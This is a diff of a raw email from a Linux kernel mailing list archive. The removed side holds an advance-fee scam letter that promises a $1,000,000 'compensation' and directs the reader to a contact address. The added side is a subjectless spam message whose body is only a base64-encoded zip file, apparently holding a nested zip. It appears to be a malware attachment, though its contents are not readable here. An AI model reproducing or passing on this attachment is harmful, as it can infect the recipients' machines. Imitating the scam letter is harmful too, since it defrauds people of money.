@@ -1,28 +1,67 @@
-From: Uba Jesuobo <"www."@dream.ocn.ne.jp>
-Subject: Dear friend,
-Date: Wed, 2 Aug 2017 19:06:52 +0900 (JST)
-Message-ID: <1131719684.12488173.1501668412715.JavaMail.root@dream.ocn.ne.jp>
-Reply-To: Uba Jesuobo <ubajesuobo@yahoo.com>
+From: <armiksanaye@gmail.com>
+Subject: (unknown)
+Date: Wed, 02 Aug 2017 11:47:50 -0000
+Message-ID: <150167447017.25647.13612670741171086298@hinet.net>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=ISO-2022-JP
-Content-Transfer-Encoding: 7bit
+Content-Type: application/zip; name="EMAIL_408667114_linux-scsi.zip"
+Content-Transfer-Encoding: base64
 Return-path: <linux-scsi-owner@vger.kernel.org>
-Received: from mbkd0226.ocn.ad.jp ([153.149.233.27]:47673 "EHLO
-        mbkd0226.ocn.ad.jp" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1752100AbdHBKe6 (ORCPT
-        <rfc822;linux-scsi@vger.kernel.org>); Wed, 2 Aug 2017 06:34:58 -0400
+Received: from 36-230-160-197.dynamic-ip.hinet.net ([36.230.160.197]:59657
+        "HELO hinet.net" rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org
+        with SMTP id S1753022AbdHBLrz (ORCPT
+        <rfc822;linux-scsi@vger.kernel.org>); Wed, 2 Aug 2017 07:47:55 -0400
+Content-Disposition: attachment
+Subject: 
 Sender: linux-scsi-owner@vger.kernel.org
 List-Id: linux-scsi@vger.kernel.org
+To: linux-scsi@vger.kernel.org
 
-Dear friend,
-I'm sorry but happy to inform you about my success in getting those  funds under the cooperation of a new partner from Vietnam though i  tried my best to involve you in the business but God decided the whole  situations. Presently I'm in Vietnam for investment projects with my own share of the total sum. 
-
-Meanwhile,i didn't forget your past efforts  and attempts to assist me in transferring those funds despite that it  failed us some how.
-
-Now contact my secretary in Burkina faso her name is Ms.Lilian sambi  on her e-mail address  mslilian.sambi@yahoo.com  ask her to send you the total of $1,000,000.00 which i kept for your compensation for all the past  efforts and attempts to assist me in this matter. 
-
-I appreciated  your efforts at that time very much. so feel free and get in touched  with my secretary Lilian sambi and instruct her where to send the amount  to you. 
-
-Please do let me know immediately you receive it so that we  can share the joy after all the sufferings then. in the moment, I’m very busy here because of the investment projects  which I and the new partner are having at hand, finally, remember that I  had forwarded instruction to the secretary on your behalf to receive  that money, so feel free to get in touch with Ms.Lilian sambi. she  will send the amount to you without any delay.
-Regards,
-Uba Jesuobo
+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
